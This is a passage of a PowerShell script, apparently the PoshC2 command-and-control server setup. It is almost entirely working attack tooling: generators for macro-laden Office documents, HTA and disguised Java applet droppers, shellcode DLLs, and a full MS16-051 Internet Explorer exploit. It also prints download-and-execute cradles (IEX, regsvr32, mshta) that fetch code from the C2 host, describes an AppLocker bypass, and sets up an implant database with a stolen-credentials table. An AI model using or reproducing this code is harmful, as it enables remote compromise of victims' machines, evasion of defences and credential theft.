yAvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAADAAAADQodih6KEwokCiSKJQoliiYKJoonCikKKYoqCiuKLAosii+KQQpRilAGAAAAwAAAAAoAAAAJAAABQAAACAq6iryKvwqxisAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = [Convert]::ToBase64String($bytes)

    $RawBytes = [System.Convert]::FromBase64String($86)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x86'
    [io.file]::WriteAllBytes("$global:newdir\payloads\posh_x86.dll", $dllBytes)
    Write-Host -Object "x86 DLL Written to: $global:newdir\payloads\posh_x86.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File $global:newdir\payloads\posh_x86.dll
    [io.file]::WriteAllBytes("$global:newdir\payloads\posh-shellcode_x86.bin", $shellcodeBytes)
    Write-Host -Object "x86 Shellcode Written to: $global:newdir\payloads\posh-shellcode_x86.bin"  -ForegroundColor Green

    $RawBytes = [System.Convert]::FromBase64String($64)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x64'
    [io.file]::WriteAllBytes("$global:newdir\payloads\posh_x64.dll", $dllBytes)
    Write-Host -Object "x64 DLL Written to: $global:newdir\payloads\posh_x64.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File $global:newdir\payloads\posh_x64.dll
    [io.file]::WriteAllBytes("$global:newdir\payloads\posh-shellcode_x64.bin", $shellcodeBytes)
    Write-Host -Object "x64 Shellcode Written to: $global:newdir\payloads\posh-shellcode_x64.bin"  -ForegroundColor Green

    Add-Type -AssemblyName Microsoft.Office.Interop.Excel
    $ExcelApp = New-Object -ComObject "Excel.Application"
    $ExcelVersion = $ExcelApp.Version

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $ExcelApp.DisplayAlerts = $false
    $ExcelApp.DisplayAlerts = "wdAlertsNone"
    $ExcelApp.Visible = $false
    $ExcelWorkbook = $ExcelApp.Workbooks.Add(1)
    $ExcelWorksheet = $ExcelWorkbook.Worksheets.Item(1)
    $ExcelVBA = $ExcelWorkbook.VBProject.VBComponents.Add(1)
    $ExcelVBA.CodeModule.AddFromString($macrodoc)
    $ExcelWorkbook.SaveAs("$global:newdir\payloads\ExcelMacro", [Microsoft.Office.Interop.Excel.XLFileFormat]::xlExcel8)
    Write-Host -Object "Weaponised Microsoft Excel Document written to: $global:newdir\payloads\ExcelMacro.xls"  -ForegroundColor Green
    $ExcelApp.Workbooks.Close()
    $ExcelApp.Quit()

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings | Out-Null

    Add-Type -AssemblyName Microsoft.Office.Interop.Word
    $WordApp = New-Object -ComObject "Word.Application"
    $WordVersion = $WordApp.Version
    
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
    
    $WordApp.Visible = $false
    $WordPage = $WordApp.Documents.Add()
    $WordVBA = $WordPage.VBProject.VBComponents.Add(1)
    $WordVBA.CodeModule.AddFromString($macrodoc)
    $WordPage.SaveAs([ref]"$global:newdir\payloads\WordMacro", [ref][Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
    Write-Host -Object "Weaponised Microsoft Word Document written to: $global:newdir\payloads\WordMacro.doc"  -ForegroundColor Green
    $WordApp.Quit()

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings | Out-Null

    Add-Type -AssemblyName Microsoft.Office.Interop.Powerpoint
    $PPTApp = New-Object -ComObject "Powerpoint.Application"
    $PPTVersion = $PPTApp.Version
    $notvisible = [microsoft.office.core.msotristate]::msoFalse

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $SlideType = "Microsoft.Office.Interop.Powerpoint.ppSlideLayout" -as [type]
    $BlankLayout = $SlideType::ppLayoutTitleOnly

    $PPTPage = $PPTApp.Presentations.Add([microsoft.office.core.msotristate]::msoFalse)
    $PPTVBA = $PPTPage.VBProject.VBComponents.Add(1)
    $PPTVBA.CodeModule.AddFromString($macrodoc)
    $PPTPage.SaveAs("$global:newdir\payloads\PowerpointMacro", [Microsoft.Office.Interop.Powerpoint.PpSaveAsFileType]::ppSaveAsPresentation)
    Write-Host -Object "Weaponised Microsoft Powerpoint Document written to: $global:newdir\payloads\PowerpointMacro.ppt"  -ForegroundColor Green
    $PPTPage.Close()
    $PPTApp.Quit()
    Stop-Process -name "POWERPNT"

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings | Out-Null
    }
    catch{
    
    }
}

# create HTA payload
function CreateHTAPayload
{

    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = '-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    
    #HTA index file generation
    # output simple html for loading HTA. This could be used with any cloned web page.
    # host this HTML and Launcher.HTA on a web server.
    # HTA Payload taken from https://github.com/trustedsec/unicorn , minus the obfuscation
    $HTMLCode = '<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>'
    $HTMLFile = "$global:newdir\payloads\index.html"
    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile

    #HTA Payload file generation
    $HTMLCode = @"
    <script>
    ao=new ActiveXObject("WScript.Shell");
    ao.run('%windir%\\System32\\' + "cmd.exe" + ' /c powershell $payloadraw', 0);window.close();
    </script>
"@
    $HTMLFile = "$global:newdir\payloads\Launcher.hta"
    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile
    Write-Host -Object "HTA Payload written to: $global:newdir\index.html and Launcher.hta"  -ForegroundColor Green
}

# create MS16-051 payload
function Create-MS16-051-Payload
{
    $poshexec = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = ' "-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $htmlpayload = $poshexec+'"'+','+$payload

  $html = @"
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
</head>
<body>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ' 2x2000 elements x 16 bytes / element = 64000 bytes
                ReDim Preserve A(1, 2000)
            End Sub

            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class

        Class Dummy
        End Class

        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper

            For i = 0 To 32
                Set plunge(i) = s
            Next

            Set aw.A(arg1, 2) = s

            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                    addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next

            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If

            getAddr = addr
        End Function

        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            Dim o
            o = aw.A(arg1, 2)

            leakMem = o
        End Function

        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            ' Single has vartype of 0x04
            aw.A(arg1, 2) = CSng(0)
        End Sub

        Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem

            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174

            ' Execute cmd
            Set Object = CreateObject("Shell.Application")
            Object.ShellExecute "$htmlpayload"
        End Function

        Function triggerBug
            ' Resize array we are currently indexing
            aw.Resize()

            ' Overlap freed array area with our exploit string
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>

    <script type="text/javascript">
        function strToInt(s)
        {
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }
        function intToStr(x)
        {
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }
        var o;
        o = {"valueOf": function () {
                triggerBug();
                return 1;
            }};
        setTimeout(function() {exploit(o);}, 50);
    </script>
</body>
</html>
"@

  [IO.File]::WriteAllLines("$global:newdir\payloads\ms16-051.html", $html)
  Write-Host -Object "MS16-051 payload, use this via a web server: $global:newdir\payloads\ms16-051.html"  -ForegroundColor Green
}
# taken from nishang Out-Java
function CreateJavaPayload
{
$OutputPath="$pwd"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$payloadraw = [Convert]::ToBase64String($bytes)

# Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
$JavaClass = @"
import java.applet.*;
import java.awt.*;
import java.io.*;
public class JavaPS extends Applet {
public void init() {
Process f;
//https://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
String arch = System.getenv("PROCESSOR_ARCHITECTURE");
String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
String cmd = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e $payloadraw";
//Remove the below if condition to use 64 bit powershell on 64 bit machines.
if (realArch == "64")
{
    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -WindowStyle Hidden -Noninteractive -nologo -noprofile -e $payloadraw";
}
try {
f = Runtime.getRuntime().exec(cmd);
}
catch(IOException e) {
e.printStackTrace();
}
Process s;
}
}
"@

# compile the Java file
$JavaFile = "$OutputPath\JavaPS.java"
Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile

$JavacPath = "$JDKPath" + "\bin\javac.exe"
& "$JavacPath" "$JavaFile"

# create a manifest for JAR, taken from SET
$Manifest = @"
Permissions: all-permissions
Codebase: *
Application-Name: Microsoft Internet Explorer Update (SECURE)
"@

$ManifestFile = "$OutputPath\manifest.txt"
Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile

# create the JAR
$Jarpath = "$JDKPath" + "\bin\jar.exe"
& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "JavaPS.class"|out-null
   
# output simple html. This could be used with any cloned web page.
# host this HTML and SignedJarPS.jar on a web server.
$HTMLCode = @'
<div> 
<object type="text/html" data="https://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
</object></div>
<applet code="JavaPS" width="1" height="1" archive="JavaPS.jar" > </applet>'
'@
$HTMLFile = "$global:newdir\payloads\applet.html"
Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   

# cleanup
Remove-Item "$OutputPath\JavaPS*"
  
# cleanup to remove temporary files
Remove-Item "$OutputPath\manifest.txt"
Write-Host -Object "Java Payload written to: $global:newdir\JavaPS.jar and applet.html"  -ForegroundColor Green
}

# if the server has been restarted using the Restart-C2Server shortcut
if ($RestartC2Server) 
{
    $global:newdir = $RestartC2Server
    $payload = Get-Content "$global:newdir\payloads\payload.bat"
    Write-Host -Object "Using existing database and payloads: $global:newdir"
    $Database = "$global:newdir\PowershellC2.SQLite"
    $taskscompleted = Invoke-SqliteQuery -DataSource $Database -Query "SELECT CompletedTaskID FROM CompletedTasks" -As SingleValue

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $ipv4address = $c2serverresults.HostnameIP 
    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
    $serverport = $c2serverresults.ServerPort 
    $shortcut = $c2serverresults.QuickCommand
    $downloaduri = $c2serverresults.DownloadURI
    $httpresponse = $c2serverresults.HTTPResponse
    $enablesound = $c2serverresults.Sounds
    $urlstring = $c2serverresults.URLS

    Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
    Write-Host "To quickly get setup for internal pentesting, run:"
    write-host $shortcut `n -ForegroundColor green
    Write-Host "For a more stealthy approach, use SubTee's exploits:"
    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
    write-host ""
    Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host ""
    Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
    write-host ""


    #launch a new powershell session with the implant handler running
    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"

    foreach ($task in $taskscompleted) {
    $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$task" -as PSObject
    $ranuri = $resultsdb.RandomURI
    $implanthost = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
    if ($resultsdb)
    {
        if ($resultsdb.Command.tolower().startswith('get-screenshot')) {}
        elseif  ($resultsdb.Command.tolower().startswith('download-file')) {}
        else 
        {
            Write-Host "Command Issued @" $resultsdb.TaskID "Against Host" $implanthost -ForegroundColor Green
            Write-Host -Object $resultsdb.Command -ForegroundColor Red
            Write-Host -Object $resultsdb.Output
        }
        $taskiddb ++
    }
    }
    $newcount = $taskscompleted.Count
    $taskiddb = $newcount+1
    write-host "$newcount tasks completed before resuming the C2 server"
}
else 
{
    # determine if there are multiple network adaptors
    $localipfull = Get-WmiObject -Query "select * from Win32_NetworkAdapterConfiguration where IPEnabled = $true" |
    Select-Object -ExpandProperty IPAddress | 
    Where-Object -FilterScript {([Net.IPAddress]$_).AddressFamily -eq 'InterNetwork'}
    if ($localipfull)
    {
        Write-Output -InputObject "IP found: $localipfull"
        write-host ""
        $prompt = Read-Host -Prompt "[1] Enter the IP address or Hostname of the Posh C2 server (External address if using NAT) [$($localipfull)]"
        $ipv4address = ($localipfull,$prompt)[[bool]$prompt]
    }
    $uri="http://"
    $prompthttpsdef = "Yes"
    $prompthttps = Read-Host -Prompt "[2] Do you want to use HTTPS for implant comms? [Yes]"
    $prompthttps = ($prompthttpsdef,$prompthttps)[[bool]$prompthttps]
    if ($prompthttps -eq "Yes") {
    $uri="https://"
    $ipv4address = "https://"+$ipv4address
    $promptssldefault = "Yes"

    #detect if powershell < v4
    $psver = $PSVersionTable.psversion.Major
    if ($psver -lt '4') {
        $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to use the default self-signed SSL certificate [Yes]"
        $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
        if ($promptssl -eq "Yes") {
            CERTUTIL -f -p poshc2 -importpfx "$PoshPath\poshc2.pfx"
            $thumb = "DE5ADA225693F8E0ED43453F3EB512CE96991747"
            $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
            $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
            if ($Added = "SSL Certificate successfully added") {
                netsh.exe http show sslcert ipport=0.0.0.0:443
            }
        } else {
            Write-Error "Error adding the certificate" 
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}
    } else {
    $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to create a new self-signed SSL certificate [Yes]"
    $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
    if ($promptssl -eq "Yes") {
        $thumb = New-SelfSignedCertificate -certstorelocation cert:\localmachine\my -dnsname $ipv4address | select thumbprint -ExpandProperty thumbprint
        $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
        $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
        if ($Added = "SSL Certificate successfully added") {
            netsh.exe http show sslcert ipport=0.0.0.0:443
        } else {
            Write-Error "Error adding the certificate" 
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}
} else {
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}

}

    $promptdomfrontdef = "No"
    $promptdomfront = Read-Host -Prompt "[2b] Do you want to use domain fronting? [No]"
    $promptdomfront = ($promptdomfrontdef,$promptdomfront)[[bool]$promptdomfront]
    if ($promptdomfront -eq "Yes") {
        $promptdomfront = Read-Host -Prompt "[2c] Please specify the host header for domain fronting?"
        if ($promptdomfront) {
            $domainfrontheader = $promptdomfront
        }
    }

    $defaultserverport = 443
    } else {
    $ipv4address = "http://"+$ipv4address
        $defaultserverport = 80
    }
    
    $apache = @"
RewriteEngine On
RewriteRule ^/webapp/static(.*) $uri<IP ADDRESS>/webapp/static`$1 [NC,P]
RewriteRule ^/connect(.*) $uri<IP ADDRESS>/connect`$1 [NC,P]
RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
"@
    $customurldef = "No"
    $customurl = Read-Host -Prompt "[3] Do you want to customize the beacon URLs from the default? [No]"
    $customurl = ($customurldef,$customurl)[[bool]$customurl]
    if ($customurl -eq "Yes") {
        $urls = @()
        do {
            $input = (Read-Host "Please enter the URLs you want to use, enter blank entry to finish: images/site/content")
            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) http://<IP ADDRESS>/$input`$1 [NC,P]"}
        }
        until ($input -eq '')
        [string]$urlstring = $null
        $urlstring = $urls -join ","
    } else {
        $urlstring = '"images/static/content/","news/id=","webapp/static/","images/prints/","wordpress/site/","steam/","true/images/77/static/","holdings/office/images/"'
            $apache = @"
RewriteEngine On
RewriteRule ^/connect(.*) $uri<IP ADDRESS>/connect`$1 [NC,P]
RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
RewriteRule ^/images/static/content/(.*) $uri<IP ADDRESS>/images/static/content/`$1 [NC,P]
RewriteRule ^/news/(.*) $uri<IP ADDRESS>/news/`$1 [NC,P]
RewriteRule ^/webapp/static/(.*) $uri<IP ADDRESS>/webapp/static/`$1 [NC,P]
RewriteRule ^/images/prints/(.*) $uri<IP ADDRESS>/images/prints/`$1 [NC,P]
RewriteRule ^/wordpress/site/(.*) $uri<IP ADDRESS>/wordpress/site/`$1 [NC,P]
RewriteRule ^/true/images/77/(.*) $uri<IP ADDRESS>/true/images/77/`$1 [NC,P]
RewriteRule ^/holdings/office/images/(.*) $uri<IP ADDRESS>/holdings/office/images/`$1 [NC,P]
RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
"@
    }

    $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
    $prompt = Read-Host -Prompt "[4] Enter a new folder name for this project [$($global:newdir)]"
    $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
    $RootFolder = $PoshPath.TrimEnd("PowershellC2\")
    $global:newdir = $RootFolder+"\"+$tempdir

    $defbeacontime = "5s"
    $prompt = Read-Host -Prompt "[5] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)]"
    $defaultbeacon = ($defbeacontime,$prompt)[[bool]$prompt]
    if ($defaultbeacon.ToLower().Contains('m')) { 
        $defaultbeacon = $defaultbeacon -replace 'm', ''
        [int]$newsleep = $defaultbeacon 
        [int]$defaultbeacon = $newsleep * 60
    }
    elseif ($defaultbeacon.ToLower().Contains('h')) { 
        $defaultbeacon = $defaultbeacon -replace 'h', ''
        [int]$newsleep1 = $defaultbeacon 
        [int]$newsleep2 = $newsleep1 * 60
        [int]$defaultbeacon = $newsleep2 * 60
    }
    elseif ($defaultbeacon.ToLower().Contains('s')) { 
        $defaultbeacon = $defaultbeacon -replace 's', ''
    } else {
        $defaultbeacon = $defaultbeacon
    }

    $killdatedefault = (get-date).AddDays(14)
    $killdatedefault = (get-date -date $killdatedefault -Format "dd/MM/yyyy")
    $prompt = Read-Host -Prompt "[6] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)]"
    $killdate = ($killdatedefault,$prompt)[[bool]$prompt]
    $killdate = [datetime]::ParseExact($killdate,"dd/MM/yyyy",$null)
    $killdatefm = Get-Date -Date $killdate -Format "dd/MM/yyyy"

    $prompt = Read-Host -Prompt "[7] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
    $serverport = ($defaultserverport,$prompt)[[bool]$prompt]

    $enablesound = "Yes"
    $prompt = Read-Host -Prompt "[8] Do you want to enable sound? [$($enablesound)]"
    $enablesound = ($enablesound,$prompt)[[bool]$prompt]
    
    $downloaduri = Get-RandomURI -Length 5
    if ($ipv4address.Contains("https")) {
        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
    } else {
        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+""     
    }

    $httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
    '
    New-Item $global:newdir -Type directory | Out-Null
    New-Item $global:newdir\downloads -Type directory | Out-Null
    New-Item $global:newdir\reports -Type directory | Out-Null
    New-Item $global:newdir\payloads -Type directory | Out-Null
    $Database = "$global:newdir\PowershellC2.SQLite"

    $Query = 'CREATE TABLE Implants (
        ImplantID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        RandomURI VARCHAR(20),
        User TEXT,
        Hostname TEXT,
        IpAddress TEXT,
        Key TEXT,
        FirstSeen TEXT,
        LastSeen TEXT,
        PID TEXT,
        Arch TEXT,
        Domain TEXT,
        Alive TEXT,
        Sleep TEXT,
        ModsLoaded TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

	$Query = 'CREATE TABLE AutoRuns (
        TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Task TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE CompletedTasks (
        CompletedTaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        TaskID TEXT,
        RandomURI TEXT,
        Command TEXT,
        Output TEXT,
        Prompt TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE NewTasks (
        TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        RandomURI TEXT,
        Command TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE Creds (
        credsID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Username TEXT,
        Password TEXT,
        Hash TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE C2Server (
        ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        HostnameIP TEXT,
        DomainFrontHeader TEXT,
        DefaultSleep TEXT,
        KillDate TEXT,
        HTTPResponse TEXT,
        FolderPath TEXT,
        ServerPort TEXT,
        QuickCommand TEXT,
        DownloadURI TEXT,
        ProxyURL TEXT,
        ProxyUser TEXT,
        ProxyPass TEXT,
        Sounds TEXT,
        URLS TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE History (
        ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Command TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

